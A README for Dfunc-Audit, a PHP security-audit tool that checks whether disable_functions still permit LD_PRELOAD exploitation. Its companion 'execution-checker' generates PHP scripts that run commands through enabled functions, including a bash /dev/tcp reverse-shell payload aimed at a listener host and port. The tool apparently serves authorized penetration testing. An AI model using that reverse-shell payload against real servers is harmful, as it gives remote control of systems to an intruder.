<p align="center"><img src="images/banner.png" /></p>

# Dfunc-Audit
This is a tool that can be used by developers to check if exploitation using LD_PRELOAD is still possible given the current disable_functions in the php.ini file and taking into consideration the PHP modules installed on the server.

Fork of [teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser).

## Installation
`git clone https://github.com/keshrisaksham/DFunc-Audit`

## Versions
This repo has three equivalent implementations:
- `original/dfunc-bypasser.py` — the original Python 2 script (unmodified, kept for reference)
- `python-3-port/dfunc-audit.py` — Python 3 port
- `php-port/dfunc-audit.php` — PHP port

Each active port also ships a companion `execution-checker` script — see
[Confirming command execution](#confirming-command-execution) below.

## Usage
Run with `-h` for the full help, including examples:
```
$ python3 python-3-port/dfunc-audit.py -h
usage: dfunc-audit.py [-h] [--url URL] [--file PATH]
                      [--gen-checker OUTPUT_FILE] [--functions LIST]
                      [--include-defaults] [--enabled-only]

Checks whether disable_functions in a phpinfo() dump still leaves room for
LD_PRELOAD-based exploitation, given the PHP modules installed on the server.

options:
  -h, --help            show this help message and exit

where to read the phpinfo from:
  --url URL             PHPinfo URL, e.g. https://example.com/phpinfo.php
  --file PATH           Local phpinfo file, e.g. dir/phpinfo

generate a standalone checker script instead:
  --gen-checker OUTPUT_FILE
                        Write a self-contained PHP script to OUTPUT_FILE. Run
                        it directly on a server to see, per function, whether
                        it is actually ENABLED or DISABLED right now, rather
                        than guessing from a phpinfo dump.
  --functions LIST      Comma-separated function names to test instead of the
                        built-in dangerous-functions list.
  --include-defaults    Test the built-in dangerous-functions list as well as
                        --functions, instead of replacing it.
  --enabled-only        Only print functions that come back ENABLED; hide the
                        disabled/unavailable ones.

examples:
  Audit a live phpinfo page:
    dfunc-audit.py --url https://example.com/phpinfo.php

  Audit a phpinfo dump you saved locally:
    dfunc-audit.py --file dir/phpinfo

  Generate a standalone checker script to run directly on the server:
    dfunc-audit.py --gen-checker check.php

  ...testing your own functions as well as the built-in list:
    dfunc-audit.py --gen-checker check.php --functions mymodule_func --include-defaults
```

The PHP port supports the same flags and prints the same help, e.g.
`php php-port/dfunc-audit.php -h` or `php php-port/dfunc-audit.php --file dir/phpinfo`.

## Generating a standalone checker script
`--gen-checker` writes a small, self-contained PHP script to a file. That script calls
`function_exists()` on a list of function names and prints whether each one is ENABLED or
DISABLED — a live, authoritative check rather than a guess from parsing a phpinfo dump.
This is useful for running directly on a server you control, to confirm what the static
phpinfo-based analysis above suggested. See the `-h` output above for the available
`--functions`, `--include-defaults` and `--enabled-only` flags. Once generated, run it on
the server with `php check.php`.

## Confirming command execution
Once `--gen-checker --enabled-only` (above) tells you which dangerous functions are
actually enabled on a lab/test target, `execution-checker` goes one step further: it
generates a standalone PHP script that runs one specific command through one of those
enabled functions, so you can confirm command execution genuinely works rather than just
that the function is callable. Only use this against servers you're authorized to test.

Supported functions: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `pcntl_exec`.
Every function gets the same default test case if you omit `--command`: it runs `id` so
you get an immediate, harmless confirmation that execution works before trying anything
riskier.

For something more than a connectivity test, `--rev-shell --host HOST --port PORT`
generates a `bash -i >& /dev/tcp/HOST/PORT 0>&1` reverse-shell payload through the chosen
function instead — e.g. pick `proc_open` and point it at a listener you control.

```
$ python3 python-3-port/execution-checker.py -h
usage: execution-checker.py [-h] --function NAME [--command CMD] [--rev-shell]
                            [--host HOST] [--port PORT] --output OUTPUT_FILE

Generates a small, self-contained PHP script that runs one command through
one specific PHP function you've already confirmed is enabled (e.g. via
dfunc-audit.py --gen-checker --enabled-only), to confirm that command
execution actually works through it on a server you are authorized to test.

options:
  -h, --help            show this help message and exit
  --function NAME       The dangerous function you've confirmed is enabled,
                        one of: exec, passthru, popen, proc_open, shell_exec,
                        system.
  --command CMD         The shell command to run through that function.
                        Defaults to 'id', a harmless default test case.
                        Ignored if --rev-shell is given.
  --rev-shell           Generate a reverse shell payload (bash -i >&
                        /dev/tcp/HOST/PORT 0>&1) instead of running --command.
                        Requires --host and --port.
  --host HOST           Listener host/IP to connect back to. Required with
                        --rev-shell.
  --port PORT           Listener port to connect back to. Required with --rev-
                        shell.
  --output OUTPUT_FILE  Where to write the generated PHP script.

examples:
  Confirm system() executes commands (uses the default 'id' test):
    execution-checker.py --function system --output check.php

  Try a different enabled function and command:
    execution-checker.py --function shell_exec --command whoami --output check.php

  Generate a reverse shell payload through proc_open:
    execution-checker.py --function proc_open --rev-shell --host 10.10.10.10 --port 4444 --output check.php

  Then on the server:
    php check.php
```

The PHP port supports the same flags and prints the same help:
`php php-port/execution-checker.php -h`.
